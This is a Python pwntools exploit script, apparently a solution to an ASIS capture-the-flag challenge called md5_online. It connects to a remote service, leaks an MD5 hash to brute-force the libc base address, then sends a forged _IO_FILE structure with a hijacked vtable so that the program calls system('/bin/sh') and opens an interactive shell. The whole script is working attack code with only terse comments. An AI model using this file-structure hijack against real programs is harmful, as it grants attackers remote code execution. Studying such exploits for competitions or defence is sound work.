
from pwn import *
from time import sleep
from Crypto.Hash import MD5
import re
context.log_level = "critical"
context.binary = "./md5_online.elf"
libc = ELF("./libc-2.24.so")
# libc = context.binary.libc

def md5(cont):
    h = MD5.new()
    h.update(cont)
    return h.hexdigest()

# def brute_heap():
#     # 0x8(0,1)???044
#     # import pdb; pdb.set_trace()
#     for a in xrange(0, 16):
#         for i in xrange(1, 256):
#             for j in xrange(1, 16):
#                 salt_ptr = int("0x8" + hex(j)[2: ] + hex(i)[2: ].rjust(2, '0') + hex(j)[2: ] + "044", 16)
#                 # info("salt_ptr @ {:#x}".format(salt_ptr))
#                 if md5('a' * 0x200 + p32(salt_ptr) + p16(0x161)) == leaked_md5:
#                     # success("found it : {:#x}".format(salt_ptr))
#                     return salt_ptr
#                 # sleep(0.01)
# 
#     raise Exception("not found!!!")

def brute_libc():
    # 0xb7 ??? cc0
    # import pdb; pdb.set_trace()
    for i in xrange(1, 256):
        for j in xrange(0, 16):
            # info(i)
            salt_ptr = int("0xf7" + hex(i)[2: ].rjust(2, '0') + hex(j)[2: ] + "cc0", 16)
            if md5('b' * 0x200 + 'b' * 4  + 'b' * 0x38 + p32(salt_ptr) + '\x03') == leaked_md5:
                # success("found it : {:#x}".format(salt_ptr))
                return salt_ptr
            # sleep(0.01)

    raise Exception("not found!!!")



# io = process("./md5_online.elf", env = {"LD_LIBRARY_PATH": "./lib"})
# io = process("./md5_online.elf", env = {"LD_PRELOAD": "./libc-2.24.so"})
# io = process("./md5_online.elf")
io = remote("76.74.177.238", 9004)

# io.sendafter("Text: ", 'a' * 0x200)
# sleep(0.01)
# 
# io.sendlineafter("[y/N] ", "n")
# 
# io.recvuntil("MD5: ")
# leaked_md5 = io.recvn(32)
# # success(leaked_md5)
# 
# heap = brute_heap() - 0x044
# assert heap & 0xfff == 0
# print("heap @ {:#x}".format(heap))

io.sendafter("Text: ", flat('b' * 0x200, 'b' * 4, 'b' * 0x38))
sleep(0.01)
io.sendlineafter("[y/N] ", "n")

io.recvuntil("MD5: ")
leaked_md5 = io.recvn(32)
# success(leaked_md5)

libc.address = brute_libc() - 0x1b6cc0
assert libc.address & 0xfff == 0
print("libc @ {:#x}".format(libc.address))

fake_file  = flat(0, 0, 0, 0) # _flags ~ _IO_read_base
fake_file += flat(0, 1, 0, next(libc.search("/bin/sh"))) #_IO_write_base ~ _IO_buf_base
fake_file += flat(0, 0, 0, 0) # _IO_buf_end ~ _IO_save_end
fake_file += flat(0, 0, 0, 0) # _markers ~ _flags2
fake_file += flat(0, 0, libc.sym['__free_hook'], 0, 0) # _old_offset ~ _offset, rw address(__free_hook, for example) for _lock
fake_file += flat(0, 0, 0, 0, 0, 0) # _codecvt ~ _mode
fake_file += flat(0) * 10 # _unused2
# fake_file += flat(libc.sym['_IO_str_jumps']) # vtable
fake_file += flat(libc.address + 0x1b49c0) # vtable

# pause()
io.sendafter("Text: ", flat('c' * 0x200, 'c' * 8, fake_file, '\0' * 4, libc.sym['system']))
sleep(0.01)

io.sendlineafter("[y/N] ", "n")

io.sendafter("Text: ", flat('c' * 0x200))
sleep(0.01)

io.sendlineafter("[y/N] ", "n")


io.interactive()
# ASIS{byp4s51n9_vT4bl3_h1J4ck1Ng_d373ct10N!!}
